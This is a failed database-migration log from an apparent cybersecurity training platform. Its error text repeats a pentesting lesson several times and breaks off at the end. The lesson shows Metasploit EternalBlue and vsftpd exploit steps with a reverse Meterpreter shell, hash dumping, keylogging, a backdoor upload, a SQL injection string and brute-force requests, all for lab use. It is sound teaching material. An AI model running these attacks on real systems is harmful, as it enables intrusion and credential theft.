2026-03-12 00:56:13.993 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "4 - Enhanced Lesson Content"
2026-03-12 00:56:14.012 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "4 - Enhanced Lesson Content" failed! Changes successfully rolled back.
2026-03-12 00:56:14.020 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

